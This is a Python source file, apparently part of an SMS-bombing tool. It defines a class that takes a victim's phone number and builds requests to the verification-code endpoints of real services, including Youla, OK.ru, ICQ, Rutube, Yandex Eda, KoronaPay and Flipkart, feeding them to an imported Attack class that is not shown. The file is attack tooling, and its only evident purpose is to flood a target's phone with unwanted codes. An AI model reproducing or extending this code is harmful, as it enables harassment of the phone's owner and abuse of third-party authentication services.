from attack import Attack
from serviceModel import ServiceModel


class Model:

    def __init__(self):
        self.services = []
        self.attack_service = Attack()

    def fillServices(self, phone: str):
        youla = ServiceModel(
            url='https://youla.ru/web-api/auth/request_code',
            data={'phone': phone},
            headers={
                'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                'Connection': 'keep-alive',
                'Host': 'youla.ru',
                'Origin': 'https://youla.ru',
                'Referer': 'https://youla.ru/'}
        )
        odnoklassniki = ServiceModel(
            url='https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone',
            data={'st.r.phone': "+"+phone},
            headers={
                'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                'Origin': 'https://ok.ru',
                'Referer': 'https://ok.ru/'
            }
        )
        icq = ServiceModel(
            url='https://icq.com/smscode/login/ru',
            data={'msisdn': phone},
            headers={
                'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                'Connection': 'keep-alive',
                'Origin': 'https://icq.com',
                'Host': 'icq.com',
                'Referer': 'https://icq.com/login/ru'
            }
        )
        worki = ServiceModel(
            url='https://api.iconjob.co/api/auth/verification_code',
            data={'phone': phone},
            headers={
                'Accept-Language': 'ru-RU',
                'Origin': 'https://worki.ru',
                'Referer': 'https://worki.ru/'
            }
        )
        rutube = ServiceModel(
            url='https://pass.rutube.ru/api/accounts/phone/send-password/',
            data={'phone': '+'+phone},
            headers={
            }
        )
        yandexEda = ServiceModel(
            url='https://eda.yandex.ru/api/v1/user/request_authentication_code',
            data={'phone_number': '+'+phone},
            headers={
            }
        )
        koronaPay = ServiceModel(
            url='https://koronapay.com/transfers/online/api/users/otps',
            data={'phone': phone},
            headers={
                'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                'Origin': 'https://koronapay.com',
                'Referer': 'https://koronapay.com/transfers/online/receive/'
            }
        )
        flipKart = ServiceModel(
            url='https://2.rome.api.flipkart.com/api/5/user/otp/generate',
            data={'loginId': phone},
            headers={
                'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                'Connection': 'keep-alive',
                'Origin': 'https://www.flipkart.com',
                'Referer': 'https://www.flipkart.com/'
            }
        )
        # CHECK self.services.append(worki)
        # CHECK self.services.append(yandexEda)
        # CHECK self.services.append(flipKart)
        #self.services.append(koronaPay)
        #self.services.append(rutube)
        #self.services.append(odnoklassniki)
        #self.services.append(youla)
        #self.services.append(icq)
        